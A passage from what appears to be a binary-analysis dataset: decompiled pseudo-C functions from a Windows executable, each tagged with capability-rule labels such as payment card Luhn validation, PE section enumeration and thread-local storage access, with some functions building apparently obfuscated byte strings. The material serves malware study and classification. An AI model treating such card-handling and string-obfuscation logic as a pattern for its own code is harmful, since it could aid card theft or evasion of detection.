*0x1400f97e0 = '\\x01';\n    }\n    if (*0x1400f97a0 == '\\0') {\n        *0x1400f97a0 = '\\x01';\n    }\n    if (*0x1400f9740 == '\\0') {\n        *0x1400f9740 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 1453
    },
    "1400b700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b7000(void)\n\n{\n    int64_t *piVar1;\n    ulong uVar2;\n    ulong uVar3;\n    \n    piVar1 = fcn.1400b6600(8);\n    *piVar1 = *0x140103500 + 0x10;\n    fcn.1400b6bc0(piVar1, 0x140106200, 0x1400ac470);\n    piVar1 = fcn.1400b6600(8);\n    *piVar1 = *0x1401031f0 + 0x10;\n    fcn.1400b6bc0(piVar1, 0x140105490, 0x140078c20);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007acc0(uVar2, piVar1);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105610, fcn.14007ae90);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007cca0(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401056a0, 0x14007ce20);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.1400989d0(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105b50, 0x140098b50);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007ce90(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401056c0, 0x14007d010);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007d080(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401056e0, 0x14007d200);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14008fdf0(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105850, fcn.14008ffc0);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.14007af40(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105630, 0x14007b0c0);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.140095120(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x1401059b0, 0x1400952a0);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    uVar2 = fcn.1400b6600(0x10);\n    fcn.140097680(uVar2, uVar3);\n    uVar3 = fcn.1400b6bc0(uVar2, 0x140105af0, 0x140097800);\n    fcn.1400b6920(uVar2);\n    fcn.14000f000(uVar3);\n    if (*0x1400f9760 == '\\0') {\n        *0x1400f9760 = '\\x01';\n    }\n    if (*0x1400f9780 == '\\0') {\n        *0x1400f9780 = '\\x01';\n    }\n    if (*0x1400f9820 == '\\0') {\n        *0x1400f9820 = '\\x01';\n    }\n    if (*0x1400f9840 == '\\0') {\n        *0x1400f9840 = '\\x01';\n    }\n    if (*0x1400f95e0 == '\\0') {\n        *0x1400f95e0 = '\\x01';\n    }\n    if (*0x1400f95f0 == '\\0') {\n        *0x1400f95f0 = '\\x01';\n    }\n    if (*0x1400f97c0 == '\\0') {\n        *0x1400f97c0 = '\\x01';\n    }\n    if (*0x1400f9620 == '\\0') {\n        *0x1400f9620 = '\\x01';\n    }\n    if (*0x1400f9800 == '\\0') {\n        *0x1400f9800 = '\\x01';\n    }\n    if (*0x1400f97e0 == '\\0') {\n        *0x1400f97e0 = '\\x01';\n    }\n    if (*0x1400f97a0 == '\\0') {\n        *0x1400f97a0 = '\\x01';\n    }\n    if (*0x1400f9740 == '\\0') {\n        *0x1400f9740 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 1388
    },
    "1400b75e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.1400b75e0(void)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    ulong uVar3;\n    ulong *arg1;\n    uint32_t uVar4;\n    uint64_t uStack272;\n    ulong uStack264;\n    ulong *puStack256;\n    ulong uStack248;\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack176;\n    \n    piVar2 = fcn.1400b6600(8);\n    *piVar2 = *0x140103500 + 0x10;\n    fcn.1400b6bc0(piVar2, 0x140106200, 0x1400ac470);\n    piVar2 = fcn.1400b6600(8);\n    *piVar2 = *0x1401031f0 + 0x10;\n    fcn.1400b6bc0(piVar2, 0x140105490, 0x140078c20);\n    piVar2 = fcn.1400b6600(8);\n    *piVar2 = *0x140103410 + 0x10;\n    fcn.1400b6bc0(piVar2, 0x140105da0, 0x14009c030);\n    uStack176 = fcn.1400b6600(8);\n    fcn.14001bae0(uStack176);\n    uVar3 = uStack176;\n    fcn.1400b6bc0(uStack176, 0x1401046a0, 0x14001bb20);\n    puStack256 = fcn.1400b6600(0x30);\n    uStack200 = 1;\n    uStack192 = 0x1400fa260;\n    fcn.14007d270(puStack256, &uStack200, uVar3);\n    *puStack256 = 0x14010aa10;\n    uVar3 = fcn.1400211c0(puStack256);\n    fcn.1400b1960(puStack256 + 4, uVar3);\n    uVar4 = 0x40105720;\n    uStack248 = fcn.1400b6bc0(puStack256, 0x140105720, 0x1400832c0);\n    *puStack256 = 0x14010a460;\n    fcn.14007d8f0(puStack256);\n    fcn.1400b6920(puStack256);\n    uVar3 = uStack248;\n    fcn.14000f000(uStack248);\n    arg1 = fcn.1400b6600(0x30);\n    uStack264 = 0x1400fa260;\n    uStack272 = 1;\n    if (uVar4 != 0) {\n        uStack264 = fcn.14009c130();\n        uStack272 = uVar4;\n    }\n    fcn.14007d270(arg1, &uStack272, uVar3);\n    *arg1 = 0x14010aa10;\n    uVar3 = fcn.1400211c0(arg1);\n    fcn.1400b1960(arg1 + 4, uVar3);\n    uVar3 = fcn.1400b6bc0(arg1, 0x140105720, 0x1400832c0);\n    *arg1 = 0x14010a460;\n    fcn.14007d8f0(arg1);\n    fcn.1400b6920(arg1);\n    fcn.14000f000(uVar3);\n    iVar1 = sub.msvcrt.dll__onexit(0x1400b6df0);\n    return -(iVar1 == 0);\n}\n",
        "token_count": 840
    },
    "1400b766": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.1400b7660(void)\n\n{\n    int64_t iVar1;\n    int64_t *arg1;\n    ulong uVar2;\n    ulong *arg1_00;\n    uint32_t uVar3;\n    uint64_t uStack192;\n    ulong uStack184;\n    ulong *puStack176;\n    ulong uStack168;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack96;\n    \n    arg1 = fcn.1400b6600(8);\n    *arg1 = *0x140103410 + 0x10;\n    fcn.1400b6bc0(arg1, 0x140105da0, 0x14009c030);\n    uStack96 = fcn.1400b6600(8);\n    fcn.14001bae0(uStack96);\n    uVar2 = uStack96;\n    fcn.1400b6bc0(uStack96, 0x1401046a0, 0x14001bb20);\n    puStack176 = fcn.1400b6600(0x30);\n    uStack120 = 1;\n    uStack112 = 0x1400fa260;\n    fcn.14007d270(puStack176, &uStack120, uVar2);\n    *puStack176 = 0x14010aa10;\n    uVar2 = fcn.1400211c0(puStack176);\n    fcn.1400b1960(puStack176 + 4, uVar2);\n    uVar3 = 0x40105720;\n    uStack168 = fcn.1400b6bc0(puStack176, 0x140105720, 0x1400832c0);\n    *puStack176 = 0x14010a460;\n    fcn.14007d8f0(puStack176);\n    fcn.1400b6920(puStack176);\n    uVar2 = uStack168;\n    fcn.14000f000(uStack168);\n    arg1_00 = fcn.1400b6600(0x30);\n    uStack184 = 0x1400fa260;\n    uStack192 = 1;\n    if (uVar3 != 0) {\n        uStack184 = fcn.14009c130();\n        uStack192 = uVar3;\n    }\n    fcn.14007d270(arg1_00, &uStack192, uVar2);\n    *arg1_00 = 0x14010aa10;\n    uVar2 = fcn.1400211c0(arg1_00);\n    fcn.1400b1960(arg1_00 + 4, uVar2);\n    uVar2 = fcn.1400b6bc0(arg1_00, 0x140105720, 0x1400832c0);\n    *arg1_00 = 0x14010a460;\n    fcn.14007d8f0(arg1_00);\n    fcn.1400b6920(arg1_00);\n    fcn.14000f000(uVar2);\n    iVar1 = sub.msvcrt.dll__onexit(0x1400b6df0);\n    return -(iVar1 == 0);\n}\n",
        "token_count": 727
    },
    "140001dd": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.140001dda(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x65;\n    arg1[1] = 0x5a;\n    arg1[2] = 0x52;\n    arg1[3] = 0x59;\n    arg1[4] = 0x4a;\n    arg1[5] = 0x5f;\n    arg1[6] = 0x1b;\n    arg1[7] = 0x4b;\n    arg1[8] = 0x5c;\n    arg1[9] = 0x57;\n    arg1[10] = 0x4b;\n    arg1[0xb] = 0x60;\n    arg1[0xc] = 0x77;\n    arg1[0xd] = 0x72;\n    arg1[0xe] = 99;\n    arg1[0xf] = 0x37;\n    arg1[0x10] = 0x20;\n    arg1[0x11] = 0x25;\n    arg1[0x12] = 0x28;\n    arg1[0x13] = 0x26;\n    arg1[0x14] = 0x2d;\n    arg1[0x15] = 0x39;\n    arg1[0x16] = 0x65;\n    arg1[0x17] = 0x62;\n    arg1[0x18] = 99;\n    arg1[0x19] = 0x4e;\n    return arg1;\n}\n",
        "token_count": 381
    },
    "14000263": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.14000263a(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x66;\n    arg1[1] = 0x57;\n    arg1[2] = 0x59;\n    arg1[3] = 0x5c;\n    arg1[4] = 0x5b;\n    arg1[5] = 0x55;\n    arg1[6] = 0x43;\n    arg1[7] = 0x1c;\n    arg1[8] = 0x5e;\n    arg1[9] = 0x56;\n    arg1[10] = 0x5a;\n    arg1[0xb] = 0x23;\n    arg1[0xc] = 0x2a;\n    arg1[0xd] = 0x31;\n    arg1[0xe] = 99;\n    arg1[0xf] = 0x22;\n    arg1[0x10] = 0x24;\n    arg1[0x11] = 0x2f;\n    arg1[0x12] = 0x2b;\n    arg1[0x13] = 0x2d;\n    arg1[0x14] = 0x2d;\n    arg1[0x15] = 0x71;\n    arg1[0x16] = 0x6b;\n    arg1[0x17] = 0x29;\n    arg1[0x18] = 0x35;\n    arg1[0x19] = 0x27;\n    arg1[0x1a] = 0x3b;\n    arg1[0x1b] = 0x39;\n    arg1[0x1c] = 0x3f;\n    arg1[0x1d] = 0x35;\n    arg1[0x1e] = 0x7d;\n    arg1[0x1f] = 0x54;\n    return arg1;\n}\n",
        "token_count": 479
    },
    "14000274": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuchar * fcn.14000274c(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x66;\n    arg1[1] = 0x57;\n    arg1[2] = 0x59;\n    arg1[3] = 0x5c;\n    arg1[4] = 0x5b;\n    arg1[5] = 0x55;\n    arg1[6] = 0x43;\n    arg1[7] = 0x1c;\n    arg1[8] = 0x5e;\n    arg1[9] = 0x56;\n    arg1[10] = 0x5a;\n    arg1[0xb] = 0x23;\n    arg1[0xc] = 0x2a;\n    arg1[0xd] = 0x31;\n    arg1[0xe] = 99;\n    arg1[0xf] = 0x34;\n    arg1[0x10] = 0x24;\n    arg1[0x11] = 0x35;\n    arg1[0x12] = 0x34;\n    arg1[0x13] = 0x2d;\n    arg1[0x14] = 0x2d;\n    arg1[0x15] = 0x4a;\n    return arg1;\n}\n",
        "token_count": 328
    },
    "14000303": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.140003030(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x78;\n    arg1[1] = 0x71;\n    arg1[2] = 0x7c;\n    arg1[3] = 0x6c;\n    arg1[4] = 0x60;\n    arg1[5] = 0x62;\n    arg1[6] = 0x58;\n    arg1[7] = 0x6e;\n    arg1[8] = 0x57;\n    arg1[9] = 0x5a;\n    arg1[10] = 0x4a;\n    arg1[0xb] = 0x2a;\n    arg1[0xc] = 0;\n    arg1[0xd] = 0x37;\n    arg1[0xe] = 0x25;\n    arg1[0xf] = 0x32;\n    arg1[0x10] = 0x35;\n    arg1[0x11] = 0x36;\n    arg1[0x12] = 0x16;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0x3e;\n    arg1[0x15] = 0x38;\n    arg1[0x16] = 0x24;\n    arg1[0x17] = 0x38;\n    arg1[0x18] = 0x28;\n    arg1[0x19] = 0x6e;\n    arg1[0x1a] = 0x2b;\n    arg1[0x1b] = 0x35;\n    arg1[0x1c] = 0x32;\n    arg1[0x1d] = 0x3d;\n    arg1[0x1e] = 0x37;\n    arg1[0x1f] = 0x31;\n    arg1[0x20] = 0x31;\n    arg1[0x21] = 0x76;\n    arg1[0x22] = 0x27;\n    arg1[0x23] = 0x39;\n    arg1[0x24] = 0x20;\n    arg1[0x25] = 0x36;\n    arg1[0x26] = 0x34;\n    arg1[0x27] = 0x3d;\n    arg1[0x28] = 0x39;\n    arg1[0x29] = 0x7e;\n    arg1[0x2a] = 0x2b;\n    arg1[0x2b] = 0xf;\n    arg1[0x2c] = 0x41;\n    arg1[0x2d] = 3;\n    arg1[0x2e] = 0xf;\n    arg1[0x2f] = 8;\n    arg1[0x30] = 10;\n    arg1[0x31] = 5;\n    arg1[0x32] = 6;\n    arg1[0x33] = 0x1c;\n    arg1[0x34] = 0xc;\n    arg1[0x35] = 0xe;\n    arg1[0x36] = 0x15;\n    arg1[0x37] = 0x5b;\n    arg1[0x38] = 0x52;\n    arg1[0x39] = 0x55;\n    arg1[0x3a] = 0x56;\n    arg1[0x3b] = 0x48;\n    arg1[0x3c] = 0x42;\n    arg1[0x3d] = 0x1c;\n    arg1[0x3e] = 0x4e;\n    arg1[0x3f] = 0x4b;\n    arg1[0x40] = 0x5c;\n    arg1[0x41] = 0x23;\n    arg1[0x42] = 0x24;\n    arg1[0x43] = 0x31;\n    arg1[0x44] = 0x30;\n    arg1[0x45] = 0x22;\n    arg1[0x46] = 0x30;\n    arg1[0x47] = 0x2a;\n    arg1[0x48] = 0x2b;\n    arg1[0x49] = 0x31;\n    arg1[0x4a] = 0x67;\n    arg1[0x4b] = 0x4a;\n    return arg1;\n}\n",
        "token_count": 1102
    },
    "1400037f": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.1400037f0(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x56;\n    arg1[1] = 0x65;\n    arg1[2] = 0x52;\n    arg1[3] = 0x50;\n    arg1[4] = 0x77;\n    arg1[5] = 0x7f;\n    arg1[6] = 0x53;\n    arg1[7] = 0x7e;\n    arg1[8] = 0x5c;\n    arg1[9] = 0x78;\n    arg1[10] = 0x47;\n    arg1[0xb] = 0x1a;\n    arg1[0xc] = 0x18;\n    arg1[0xd] = 0x1a;\n    arg1[0xe] = 0x21;\n    arg1[0xf] = 0x2a;\n    arg1[0x10] = 0x3c;\n    arg1[0x11] = 0x3f;\n    arg1[0x12] = 0x2f;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0x28;\n    arg1[0x15] = 0x2e;\n    arg1[0x16] = 0x2f;\n    arg1[0x17] = 0x29;\n    arg1[0x18] = 0x29;\n    arg1[0x19] = 0x6e;\n    arg1[0x1a] = 0x3d;\n    arg1[0x1b] = 0x3f;\n    arg1[0x1c] = 0x24;\n    arg1[0x1d] = 0x26;\n    arg1[0x1e] = 0x3a;\n    arg1[0x1f] = 0x3a;\n    arg1[0x20] = 0x30;\n    arg1[0x21] = 0x76;\n    arg1[0x22] = 0x23;\n    arg1[0x23] = 0x37;\n    arg1[0x24] = 0x79;\n    arg1[0x25] = 0x1b;\n    arg1[0x26] = 0xb;\n    arg1[0x27] = 0x1f;\n    arg1[0x28] = 0x7d;\n    arg1[0x29] = 0x2f;\n    arg1[0x2a] = 0x2a;\n    arg1[0x2b] = 5;\n    arg1[0x2c] = 0x14;\n    arg1[0x2d] = 7;\n    arg1[0x2e] = 0x43;\n    arg1[0x2f] = 0x17;\n    arg1[0x30] = 0x10;\n    arg1[0x31] = 5;\n    arg1[0x32] = 4;\n    arg1[0x33] = 0xd;\n    arg1[0x34] = 0x1a;\n    arg1[0x35] = 0x19;\n    arg1[0x36] = 0x53;\n    arg1[0x37] = 0x43;\n    arg1[0x38] = 0x5b;\n    arg1[0x39] = 0x54;\n    arg1[0x3a] = 0x40;\n    arg1[0x3b] = 0x14;\n    arg1[0x3c] = 0x3b;\n    return arg1;\n}\n",
        "token_count": 897
    },
    "140003b6": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.140003b6c(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x51;\n    arg1[1] = 0x61;\n    arg1[2] = 0x75;\n    arg1[3] = 0x77;\n    arg1[4] = 0x76;\n    arg1[5] = 0x52;\n    arg1[6] = 0x48;\n    arg1[7] = 0x4a;\n    arg1[8] = 0x6a;\n    arg1[9] = 0x6d;\n    arg1[10] = 0x49;\n    arg1[0xb] = 4;\n    arg1[0xc] = 0xc;\n    arg1[0xd] = 10;\n    arg1[0xe] = 0x11;\n    arg1[0xf] = 0x35;\n    arg1[0x10] = 2;\n    arg1[0x11] = 3;\n    arg1[0x12] = 0x32;\n    arg1[0x13] = 0x68;\n    arg1[0x14] = 0x3b;\n    arg1[0x15] = 0x2f;\n    arg1[0x16] = 0x38;\n    arg1[0x17] = 0x39;\n    arg1[0x18] = 0x20;\n    arg1[0x19] = 0x2b;\n    arg1[0x1a] = 0x2b;\n    arg1[0x1b] = 0x70;\n    arg1[0x1c] = 0x25;\n    arg1[0x1d] = 0x3a;\n    arg1[0x1e] = 0x21;\n    arg1[0x1f] = 0x31;\n    arg1[0x20] = 0x34;\n    arg1[0x21] = 0x32;\n    arg1[0x22] = 0x77;\n    arg1[0x23] = 0x2b;\n    arg1[0x24] = 0x2c;\n    arg1[0x25] = 0x39;\n    arg1[0x26] = 0x38;\n    arg1[0x27] = 0x39;\n    arg1[0x28] = 0x2e;\n    arg1[0x29] = 0x2d;\n    arg1[0x2a] = 0x39;\n    arg1[0x2b] = 0x15;\n    arg1[0x2c] = 0xd;\n    arg1[0x2d] = 0xe;\n    arg1[0x2e] = 0x1a;\n    arg1[0x2f] = 0x4a;\n    arg1[0x30] = 0x65;\n    return arg1;\n}\n",
        "token_count": 715
    },
    "14000fa4": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.14000fa40(void)\n\n{\n    // WARNING: Could not recover jumptable at 0x0001400185b8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_fopen)();\n    return;\n}\n",
        "token_count": 64
    },
    "140004d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * fcn.140004d80(int64_t arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(arg1 + 0x120) == 0) {\n        *(arg1 + 0x130) = 1;\n        piVar1 = NULL;\n    }\n    else {\n        iVar2 = *(arg2 + 0x10);\n        piVar1 = *(*(*(arg1 + 0x120) + 8) + 0x18);\n        if (-1 < iVar2) {\n            for (; (piVar1 != NULL && (*piVar1 == 0x2f)); piVar1 = *(piVar1 + 6)) {\n                if (iVar2 == 0) {\n                    return *(piVar1 + 4);\n                }\n                iVar2 = iVar2 + -1;\n            }\n            piVar1 = NULL;\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 217
    },
    "1400b15c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool fcn.1400b15c0(int64_t arg1, int64_t arg2, char **arg3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *pcVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    bool bVar7;\n    \n    pcVar3 = *arg3;\n    uVar5 = *(pcVar3 + -0x18) - 1;\n    uVar4 = arg2 - 1U;\n    if (uVar5 < arg2 - 1U) {\n        uVar4 = uVar5;\n    }\n    if (uVar4 == 0) {\n        bVar7 = true;\n    }\n    else {\n        uVar6 = 0;\n        do {\n            bVar7 = pcVar3[uVar5] == *(arg1 + uVar6);\n            uVar6 = uVar6 + 1;\n            uVar5 = uVar5 - 1;\n            if (uVar4 <= uVar6) break;\n        } while (bVar7);\n    }\n    cVar2 = *(arg1 + uVar4);\n    while ((uVar5 != 0 && (bVar7 != false))) {\n        pcVar1 = pcVar3 + uVar5;\n        uVar5 = uVar5 - 1;\n        bVar7 = *pcVar1 == cVar2;\n    }\n    if (cVar2 - 1U < 0x7e) {\n        bVar7 = bVar7 & (*pcVar3 == cVar2 || *pcVar3 < cVar2);\n    }\n    return bVar7;\n}\n",
        "token_count": 374
    },
    "1400b64f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.1400b64f0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2;\n    ulong uVar3;\n    char cVar4;\n    ulong *puVar5;\n    code *pcVar6;\n    int64_t *piVar7;\n    int64_t **ppiVar8;\n    ulong arg1_00;\n    uint64_t uVar9;\n    int64_t iVar10;\n    ulong *puVar11;\n    uchar auStack288 [16];\n    ulong uStack272;\n    int64_t *piStack240;\n    \n    iVar10 = 1;\n    if (arg1 != 0) {\n        iVar10 = arg1;\n    }\n    while( true ) {\n        puVar5 = sub.msvcrt.dll_malloc(iVar10);\n        if (puVar5 != NULL) {\n            return puVar5;\n        }\n        pcVar6 = fcn.1400b05d0();\n        if (pcVar6 == NULL) break;\n        (*pcVar6)();\n    }\n    piVar7 = fcn.1400b6600(8);\n    *piVar7 = *0x140103570 + 0x10;\n    fcn.1400b6bc0(piVar7, 0x1401063b0, fcn.1400ae670);\n    puVar5 = sub.msvcrt.dll_malloc(0x90);\n    if (puVar5 == NULL) {\n        iVar10 = 0x90;\n        puVar5 = fcn.14001a310(0x90);\n        if (puVar5 == NULL) {\n            fcn.1400b2e40();\n            piVar7 = iVar10 + 0xa0;\n            puVar5 = sub.msvcrt.dll_malloc();\n            if ((puVar5 != NULL) || (puVar5 = fcn.14001a310(piVar7),  puVar5 != NULL)) {\n                *puVar5 = 0;\n                puVar5[0x13] = 0;\n                puVar11 = puVar5 + 1 & 0xfffffffffffffff8;\n                for (uVar9 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n                    *puVar11 = 0;\n                    puVar11 = puVar11 + 1;\n                }\n                return puVar5 + 0x14;\n            }\n            fcn.1400b2e40();\n            ppiVar8 = fcn.1400b6970();\n            piVar1 = piVar7 + -10;\n            piStack240 = *ppiVar8;\n            if (*piVar7 + 0xb8b1aabcbcd4d500U < 2) {\n                iVar2 = *(piVar7 + -5);\n                if (iVar2 < 0) {\n                    iVar2 = -iVar2;\n                }\n                *(piVar7 + -5) = iVar2 + 1;\n                *(ppiVar8 + 1) = *(ppiVar8 + 1) + -1;\n                if (piStack240 != piVar1) {\n                    piVar7[-6] = piStack240;\n                    *ppiVar8 = piVar1;\n                }\n                return piVar7[-1];\n            }\n            if (piStack240 == NULL) {\n                *ppiVar8 = piVar1;\n                return NULL;\n            }\n            fcn.1400b2e40();\n            if ((piStack240 == NULL) || (fcn.1400b6670(piStack240),  1 < *piStack240 + 0xb8b1aabcbcd4d500U)) {\n                fcn.1400b2e40();\n            }\n            iVar10 = piStack240[-7];\n            fcn.140019910();\n            fcn.1400b6670(iVar10);\n            uStack272 = *(iVar10 + -0x10);\n            arg2 = *(iVar10 + -0x18);\n            iVar2 = *(iVar10 + -0x24);\n            uVar3 = *(iVar10 + -0x38);\n            arg1_00 = fcn.140019930(*(iVar10 + -0x40));\n            fcn.1400b6670(arg1_00);\n            piVar7 = fcn.1400b6980();\n            puVar5 = *piVar7;\n            if ((*(puVar5 + 10) & 1) == 0) goto code_r0x0001400b67ea;\n            puVar5 = *puVar5;\n            while( true ) {\n                fcn.140019500(0, arg2, auStack288);\n                cVar4 = fcn.1400195f0(auStack288, puVar5[-0x12], puVar5, iVar2);\n                if (cVar4 != '\\0') break;\n                puVar5 = 0x140105740;\n                cVar4 = fcn.1400195f0(auStack288, 0x140105740, 0, iVar2);\n                if (cVar4 == '\\0') goto code_r0x0001400b680d;\n                piVar7 = fcn.1400b6600(8);\n                *piVar7 = *0x1401032a0 + 0x10;\n                fcn.1400b6bc0(piVar7, 0x140105740, 0x140083310);\ncode_r0x0001400b67ea:\n                puVar5 = puVar5 + 0x12;\n            }\n            fcn.1400b6b70();\ncode_r0x0001400b680d:\n            fcn.140019910(uVar3);\n            ppiVar8 = fcn.1400b6970();\n            piVar7 = *ppiVar8;\n            if (piVar7 != NULL) {\n                if ((*(piVar7 + 10) & 1) != 0) {\n                    piVar7 = *piVar7 + -0x90;\n                }\n                piVar7 = *piVar7;\n            }\n            return piVar7;\n        }\n    }\n    *puVar5 = 0;\n    puVar5[0x11] = 0;\n    puVar11 = puVar5 + 1 & 0xfffffffffffffff8;\n    for (uVar9 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0x90U >> 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    return puVar5;\n}\n",
        "token_count": 1510
    },
    "1400b697": {
        "rules": [
            "contain loop",
            "get thread local storage value",
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid fcn.1400b6970(ulong param_1, ulong param_2, uint64_t param_3, uint64_t param_4)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint64_t *puVar7;\n    uint64_t uVar8;\n    uint64_t *puVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n    piVar2 = *0x140102a70;\n    if (**0x140102a70 == 0) {\n        if (*0x1400fc390 != 0) {\n            return;\n        }\n        *0x1400fc390 = fcn.14000f2f0(0x1400fc380);\n        return;\n    }\n    uVar11 = *0x1400fc390;\n    if (*0x1400fc390 == 0) {\n        if (**0x140102a70 == 0) {\ncode_r0x00014000f5ba:\n            uVar11 = *0x1400fc390;\n            if (*0x1400fc390 == 0) goto code_r0x00014000f5c7;\n        }\n        else {\n            param_4 = *0x1400f9430;\n            if (*0x1400f9430 == 0) {\n                LOCK();\n                *0x1400f9434 = *0x1400f9434 + 1;\n                if (*0x1400f9434 == 0) {\n                    func_0x00014000f390();\n                    *0x1400f9430 = 1;\n                }\n                else {\n                    param_3 = 0;\n                    do {\n                        (*pcVar4)();\n                    } while (*0x1400f9430 == 0);\n                }\n                if (*piVar2 == 0) goto code_r0x00014000f5ba;\n            }\n            LOCK();\n            *0x1401291a0 = *0x1401291a0 + 1;\n            if ((*0x1401291a0 != 0) &&\n               (iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x1401291a8, 0xffffffff),  iVar6 != 0)) {\n                LOCK();\n                *0x1401291a0 = *0x1401291a0 + -1;\n            }\n            if (*0x1400fc390 == 0) {\ncode_r0x00014000f5c7:\n                *0x1400fc390 = *0x140129190 + 1;\n                *0x140129190 = *0x1400fc390;\n            }\n            uVar11 = *0x1400fc390;\n            if (*piVar2 != 0) {\n                LOCK();\n                *0x1401291a0 = *0x1401291a0 + -1;\n                if (-1 < *0x1401291a0) {\n                    param_3 = 0;\n                    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x1401291a8, 1);\n                }\n            }\n        }\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    uVar3 = *0x140129198;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    puVar7 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(uVar3);\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar5);\n    if (puVar7 == NULL) {\n        puVar7 = uVar11 + 0x21;\n        uVar8 = 8;\n        puVar9 = sub.msvcrt.dll_calloc();\n        if (puVar9 == NULL) 